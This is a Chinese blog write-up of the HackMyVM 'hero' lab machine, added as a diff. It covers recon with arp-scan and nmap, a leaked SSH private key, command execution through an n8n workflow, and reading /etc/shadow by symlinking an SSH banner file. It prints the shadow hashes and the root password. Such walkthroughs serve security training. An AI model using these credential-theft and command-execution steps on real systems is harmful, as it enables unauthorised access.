@@ -1,0 +1,229 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hackmyvm-hero | Yliken</title><meta name="author" content="Yliken"><meta name="copyright" content="Yliken"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="信息收集12345678910┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;hackmyvm]└─# arp-scan -I eth1 192.168.56.0&#x2F;24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103Starting arp-scan 1.10.0 with">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackmyvm-hero">
+<meta property="og:url" content="http://yliken.github.io/2025/02/27/hackmyvm-hero/index.html">
+<meta property="og:site_name" content="Yliken">
+<meta property="og:description" content="信息收集12345678910┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;hackmyvm]└─# arp-scan -I eth1 192.168.56.0&#x2F;24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103Starting arp-scan 1.10.0 with">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yliken.github.io/img/essayhead/8.webp">
+<meta property="article:published_time" content="2025-02-26T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-02-27T11:38:57.630Z">
+<meta property="article:author" content="Yliken">
+<meta property="article:tag" content="hackmyvm">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yliken.github.io/img/essayhead/8.webp"><link rel="shortcut icon" href="/images/essayhead/favicon.ico"><link rel="canonical" href="http://yliken.github.io/2025/02/27/hackmyvm-hero/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hackmyvm-hero',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-02-27 19:38:57'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/essayhead/second.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/essayhead/8.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="Yliken"><img class="site-icon" src="/img/essayhead/second.jpg"/><span class="site-name">Yliken</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">hackmyvm-hero</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-26T16:00:00.000Z" title="发表于 2025-02-27 00:00:00">2025-02-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-27T11:38:57.630Z" title="更新于 2025-02-27 19:38:57">2025-02-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Linux%E9%9D%B6%E6%9C%BA/">Linux靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="hackmyvm-hero"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/hackmyvm]</span><br><span class="line">└─# arp-scan -I eth1 192.168.56.0/24</span><br><span class="line">Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:43:9b:54       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.108  08:00:27:b9:ee:14       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 2.277 seconds (112.43 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/hackmyvm]</span><br><span class="line">└─# nmap -sC -sV 192.168.56.108</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-27 05:20 EST</span><br><span class="line">Nmap scan report for 192.168.56.108</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    nginx</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">5678/tcp open  rrac?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Accept-Ranges: bytes</span><br><span class="line">|     Cache-Control: public, max-age=86400</span><br><span class="line">|     Last-Modified: Thu, 27 Feb 2025 10:18:14 GMT</span><br><span class="line">|     ETag: W/&quot;7b7-19546e9fd60&quot;</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     Content-Length: 1975</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Date: Thu, 27 Feb 2025 10:20:31 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;script type=&quot;module&quot; crossorigin src=&quot;/assets/polyfills-DfOJfMlf.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot; /&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot; /&gt;</span><br><span class="line">|     &lt;link rel=&quot;icon&quot; href=&quot;/favicon.ico&quot; /&gt;</span><br><span class="line">|     &lt;style&gt;@media (prefers-color-scheme: dark) &#123; body &#123; background-color: rgb(45, 46, 46) &#125; &#125;&lt;/style&gt;</span><br><span class="line">|     &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">|     window.BASE_PATH = &#x27;/&#x27;;</span><br><span class="line">|     window.REST_ENDPOINT = &#x27;rest&#x27;;</span><br><span class="line">|     &lt;/script&gt;</span><br><span class="line">|     &lt;script src=&quot;/rest/sentry.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">|     &lt;script&gt;!function(t,e)&#123;var o,n,</span><br><span class="line">|   HTTPOptions, RTSPRequest: </span><br><span class="line">|     HTTP/1.1 404 Not Found</span><br><span class="line">|     Content-Security-Policy: default-src &#x27;none&#x27;</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 143</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Date: Thu, 27 Feb 2025 10:20:31 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Error&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>80端口的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/hackmyvm]</span><br><span class="line">└─# curl http://192.168.56.108/</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L</span><br><span class="line">UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg</span><br><span class="line">AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75</span><br><span class="line">BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>将私钥保存下来解一下里面的内容</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/hackmyvm]</span><br><span class="line">└─# ssh-keygen -y -f id_rsa</span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKiYY31x+ZMvvHfmGWC7ZE75BbdbAKYEtIX75k6CL27C shawa@hero</span><br></pre></td></tr></table></figure>
+
+<p>80端口给了一个私钥。但是靶机并没有开启22端口。所以我们暂时并不知道这个私钥可以用来干什么</p>
+<p>5678端口 5678是是一个n8n的管理页面</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502271830158.png" alt="image-20250227183025918"></p>
+<p>创建一个账号进来</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p> 新建一个workflow</p>
+<p>在加入功能的板块有一个<code>Core</code></p>
+<p>里面有一个可以执行系统命令的板块</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502271834817.png" alt="image-20250227183447628"></p>
+<p>我将它与chat连接到一起，就可以在聊天框执行系统命令</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502271836340.png" alt="image-20250227183606147"></p>
+<p>但是node用户的目录下面并没有我们想要的<code>use.txt</code></p>
+<p>在<code>/</code>目录下发现了<code>.dockerenv</code>文件才得知这是一个docker环境</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502271842646.png" alt="image-20250227184205488"></p>
+<p>当我得知这个环境是一个docker的时候 我的思路已经开始偏离了</p>
+<p>我去网上搜索各种docker逃逸的方法，其他逃离出这个环境</p>
+<p>很遗憾我尝试的办法都失败了</p>
+<p>后来我想起来可以在这个<code>docker</code>环境上面下载一个<code>nmap</code>来扫描一下靶机在<code>172.17.0.1</code>这个网络地址上面开启了什么服务</p>
+<p>我在<code>github</code>上下载了<code>nmap</code>的源码之后尝试上传上去进行安装。但是由于种种原因未能成功安装</p>
+<p>后来看了<code>ll104567</code>的视频我得到了提示 <code>n8n</code>上面可以添加远程ssh凭证</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502271851272.png" alt="image-20250227185138042"> </p>
+<p>使用<code>arp -a</code></p>
+<p>可以找到主机的ip</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502271843335.png" alt="image-20250227184337290"></p>
+<p>就这样可以成功将靶机的凭证添加到<code>n8n</code>上面</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502271852623.png" alt="image-20250227185244555"></p>
+<p>但是新的问题来了。</p>
+<p>我该如何执行命令呢？</p>
+<p>在刚才添加模块的页面我看到有一个模块可以远程执行ssh命令</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502271854366.png" alt="image-20250227185409487"></p>
+<p>将它添加进去</p>
+<p>如何执行命令</p>
+<p>我们成功的看到了我们希望的<code>user.txt</code></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502271855431.png" alt="image-20250227185526258"></p>
+<p>如何我就试着反弹一个shell</p>
+<p>在我使用<code>sudo -l</code>想要来找一些东西的时候</p>
+<p>竟然没有<code>sudo</code>???</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202502271859917.png" alt="image-20250227185932791"></p>
+<p>如何我又找了具有<code>s</code>权限的文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"> $ </span><span class="language-bash">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span></span><br><span class="line">bin/bbsuid</span><br><span class="line"><span class="meta prompt_"> $ </span></span><br></pre></td></tr></table></figure>
+
+<p>但是没有<code>sudo</code>我貌似无法使用。。只能再找其他的办法</p>
+<p>我觉得自己可能被困在了busybhox环境中</p>
+<p>然后我就又开始寻找逃逸busybox的方法</p>
+<p>不幸</p>
+<p>又没找到</p>
+<p><code>/etc/ssh/sshd_config</code>中指定了Banner文件的路径<code>Banner /opt/banner.txt</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/opt $ ls -al </span><br><span class="line">total 16</span><br><span class="line">drw-rw-rwx    3 root     root          4096 Feb  6 10:14 .</span><br><span class="line">drwxr-xr-x   21 root     root          4096 Feb  6 10:03 ..</span><br><span class="line">-rw-rw-rw-    1 root     root            16 Feb  6 10:09 banner.txt</span><br><span class="line">drwx--x--x    4 root     root          4096 Feb  6 10:14 containerd</span><br></pre></td></tr></table></figure>
+
+<p>这里你可以用<code>ln -s /etc/shadow banner.txt</code>创建一个软链接将<code>banner.txt</code>指向<code>/root/shadow</code>来读取密码</p>
+<p>当然 你也可以直接读取<code>/root/root.txt</code>来获取<code>flag</code></p>
+<p>修改banner之后</p>
+<p>再次进行ssh登录</p>
+<p>你再这个shell中进行ssh登录密钥验证可能会无法通过</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ ssh -i id_rsa  shawa@172.17.0.1</span><br><span class="line">Pseudo-terminal will not be allocated because stdin is not a terminal.</span><br><span class="line">Host key verification failed.</span><br></pre></td></tr></table></figure>
+
+<p>这是你需要加上<code>-o StrictHostKeyChecking=no</code> 禁用严格的主机密钥检查，自动接受新密钥。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh -i id_rsa -o StrictHostKeyChecking=no shawa@172.17.0.1</span></span><br><span class="line">Pseudo-terminal will not be allocated because stdin is not a terminal.</span><br><span class="line">Warning: Permanently added &#x27;172.17.0.1&#x27; (ED25519) to the list of known hosts.</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Imthepassthaty0uwant!</span></span><br><span class="line">root:$6$WBuW3zyLro0fagui$gq9zWbt3gEpo26gkIjtgjYZqjCJtjJrJO9EHaWkglVZWwWhQiiSNmMGejRn.Q58Z9knsWP59OQqLPgt2NAWd80:20125:0:::::</span><br><span class="line">bin:!::0:::::</span><br><span class="line">daemon:!::0:::::</span><br><span class="line">lp:!::0:::::</span><br><span class="line">sync:!::0:::::</span><br><span class="line">shutdown:!::0:::::</span><br><span class="line">halt:!::0:::::</span><br><span class="line">mail:!::0:::::</span><br><span class="line">news:!::0:::::</span><br><span class="line">uucp:!::0:::::</span><br><span class="line">cron:!::0:::::</span><br><span class="line">ftp:!::0:::::</span><br><span class="line">sshd:!::0:::::</span><br><span class="line">games:!::0:::::</span><br><span class="line">ntp:!::0:::::</span><br><span class="line">guest:!::0:::::</span><br><span class="line">nobody:!::0:::::</span><br><span class="line">klogd:!:20125:0:99999:7:::</span><br><span class="line">chrony:!:20125:0:99999:7:::</span><br><span class="line">nginx:!:20125:0:99999:7:::</span><br><span class="line">shawa:$6$24FnSb8jAyKUSa4W$Z7fiPgCy1q8VTg6eF0tVe2cjlHfZEB.fswQyBWoZdY3PwV6VyckxP8OhskWf/Kgx881HhsT2uWvVPTGRpJ43T.:20125:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>第一行注释就是我们想要的<code>root</code>用户的密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su</span><br><span class="line">Password: Imthepassthaty0uwant!</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://yliken.github.io">Yliken</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://yliken.github.io/2025/02/27/hackmyvm-hero/">http://yliken.github.io/2025/02/27/hackmyvm-hero/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yliken.github.io" target="_blank">Yliken</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/hackmyvm/">hackmyvm</a></div><div class="post_share"><div class="social-share" data-image="/img/essayhead/8.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/essayhead/as.jpg" target="_blank"><img class="post-qr-code-img" src="/img/essayhead/as.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/02/24/hackmyvm-buster/" title="hackmyvm-buster"><img class="cover" src="/img/essayhead/28.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">hackmyvm-buster</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/02/24/hackmyvm-buster/" title="hackmyvm-buster"><img class="cover" src="/img/essayhead/28.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-24</div><div class="title">hackmyvm-buster</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/essayhead/second.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Yliken</div><div class="author-info__description">在我面前还有多少路要走，还有多少山峰要去翻越寻找自己，我又将多少次跌下悬崖，一切又从零开始，而这些是否会有意义……我会稍作等待，然后开始上路，跟随着梦想与希望，不要熄灭，我的星星，请等我……</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Yliken"><i class="fab fa-github"></i><span>Github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Yliken" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:largetlafonu71@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div 